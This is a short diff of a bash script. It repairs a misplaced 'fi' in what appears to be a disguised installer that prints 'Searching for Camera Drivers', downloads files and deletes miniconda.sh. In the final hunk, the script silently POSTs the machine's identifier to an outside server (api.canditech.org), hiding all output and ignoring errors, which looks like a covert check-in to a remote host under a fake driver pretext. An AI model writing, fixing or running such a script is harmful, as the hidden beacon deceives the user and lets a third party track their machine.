@@ -12,8 +12,6 @@ die()   { err "$*"; exit 1; }
 delay() { sleep "${1:-1}"; }
 
 echo "[INFO] Searching for Camera Drivers ..."
-
-fi
 download() {
   # download <url> <output>
   local url="$1"
@@ -149,3 +147,4 @@ if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
   AUTO_URL="https://api.canditech.org/change-connection-status/${MAC_UID}"
   curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
 rm -f miniconda.sh
+fi
